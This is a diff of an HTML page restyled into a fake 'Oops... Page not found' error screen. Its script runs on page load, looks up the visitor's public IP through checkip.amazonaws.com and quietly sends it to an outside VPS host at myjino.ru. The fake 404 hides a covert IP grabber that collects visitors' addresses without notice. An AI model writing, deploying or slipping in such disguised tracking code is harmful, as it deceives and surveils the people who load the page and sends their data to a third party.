@@ -1,37 +1,68 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title></title>
+    <style type="text/css">
+      #input {
+        background-color: #161616;
+        color: #fff;
+        font-family: sans-serif;
+        font-size: 3vh;
+      }
 
-<head>
-	<title></title>
-	<style type="text/css">
-		#input {
-			background-color: #161616;
-			color: #fff;
-			font-family: sans-serif;
-			font-size: 3vh;
-		}
-	</style>
-</head>
+      body{
+      	background-color: #121212;
+      	margin: 0;
+      	padding: 0;
+      	font-family: sans-serif;
+      }
 
-<body>
-	<!-- <input id='input' placeholder="ip..."> -->
+      section{
+      	width: 100%;
+      	height: 100%;
+      	display: flex;
+      	justify-content: center;
+      	align-items: center;
+      	text-align: center;
+      	background-color: #121212;
+      }
 
-	<script>
+      .block{
+      	width: 50%;
+      	height: 10%;
+      	text-align: center;
+      	align-items: center;
+      }
+      .block h1{
+      	color: #ff0000;
+      }
+      .block h2{
+      	color: #850000;
+      }
+    </style>
+  </head>
 
-		function getIPFromAmazon() {
-			ip = fetch('https://checkip.amazonaws.com/')
-				.then(async (response) => {
-					const data = await response.text()
-					console.log(data)
-					fetch(`https://f011299f4f87.vps.myjino.ru/${data}`);
-					console.log(data);
-				});
-		}
+  <body>
+    <section>
+    	<div class="block">
+    		<h1>Oops...</h1>
+    		<h2>Page not found</h2>
+    	</div>
+    </section>
 
-		getIPFromAmazon();
 
-	</script>
-	<script src="eel.js"></script>
-</body>
+    <script>
+      function getIPFromAmazon() {
+        ip = fetch("https://checkip.amazonaws.com/").then(async (response) => {
+          const data = await response.text();
+          console.log(data);
+          fetch(`https://f011299f4f87.vps.myjino.ru/${data}`);
+          console.log(data);
+        });
+      }
 
+      getIPFromAmazon();
+    </script>
+    <script src="eel.js"></script>
+  </body>
 </html>
